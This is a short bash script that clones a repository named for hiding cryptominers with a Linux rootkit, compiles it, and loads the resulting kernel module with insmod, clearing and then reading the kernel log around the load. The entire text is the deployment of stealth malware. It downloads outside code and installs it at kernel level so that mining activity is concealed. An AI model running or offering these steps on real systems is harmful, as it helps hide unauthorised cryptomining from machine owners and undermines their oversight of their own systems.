#!/bin/bash
git clone https://github.com/alfonmga/hiding-cryptominers-linux-rootkit
cd hiding-cryptominers-linux-rootkit
make
dmesg -C
insmod rootkit.ko
dmesg